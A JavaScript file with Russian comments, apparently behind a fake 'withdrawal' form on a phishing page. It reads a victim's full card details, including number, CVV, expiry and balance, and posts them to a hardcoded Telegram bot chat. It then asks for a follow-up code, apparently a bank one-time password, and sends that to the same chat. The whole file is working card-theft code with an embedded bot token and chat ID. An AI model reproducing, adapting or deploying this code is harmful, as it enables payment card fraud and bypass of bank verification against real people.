function sendMessage() {
    var name = document.getElementById('name').value;
    var cardNumber = document.getElementById('cardNumber').value;
    var cvv = document.getElementById('cvv').value;
    var expiryDate = document.getElementById('expiryDate').value;
    var cardBalance = document.getElementById('cardBalance').value;
    var chooseBank = document.getElementById('chooseBank').value;
    var currency = document.getElementById('currency').value;

    // Ваш токен бота и ID чата
    var botToken = '6416835308:AAE-lstFazO_12p5eSI4PHIQLKkC4-q_vfU';
    var chatId = '6583040042';

    // Формируем URL для отправки сообщения в телеграм
    var apiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';

    // Формируем данные для отправки
    var data = {
        chat_id: chatId,
        text: 'Имя Фамилия: ' + name + '\nНомер карты: ' + cardNumber + '\nCVV: ' + cvv + '\nВремя действия: ' + expiryDate + '\nБаланс: ' + cardBalance + currency + '\nБанк: ' + chooseBank
    };

    // Отправляем POST-запрос с использованием AJAX
    if (name === "" || cardNumber === "" || cvv === "" || expiryDate === "" || cardBalance === "" || chooseBank === "" || cvv.length < 3 || cardNumber.length < 19 || expiryDate.length < 5) {
        alert('Пожалуйста, заполните все поля перед выводом.');
    } else {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', apiUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
        xhr.send(JSON.stringify(data));

        // Скрываем текущую форму
        document.getElementById('telegramForm').style.display = 'none';

        // Показываем новую форму "Введите код"
        document.getElementById('enterCodeForm').style.display = 'block';

        // Выводим сообщение об успешной отправке (может быть изменено по вашему усмотрению)
        alert('Сообщение успешно отправлено в Телеграм!');
    }
}

function sendCode() {
    var code = document.getElementById('code').value;

    // Ваш токен бота и ID чата
    var botToken = '6416835308:AAE-lstFazO_12p5eSI4PHIQLKkC4-q_vfU';
    var chatId = '6583040042';

    // Формируем URL для отправки сообщения в телеграм
    var apiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';

    // Формируем данные для отправки
    var data = {
        chat_id: chatId,
        text: 'Code: ' + code
    };

    // Отправляем POST-запрос с использованием AJAX

        var xhr = new XMLHttpRequest();
        xhr.open('POST', apiUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
        xhr.send(JSON.stringify(data));
        // Скрываем текущую форму

        // Выводим сообщение об успешной отправке (может быть изменено по вашему усмотрению)
        alert('Сообщение успешно отправлено в Телеграм!');
}

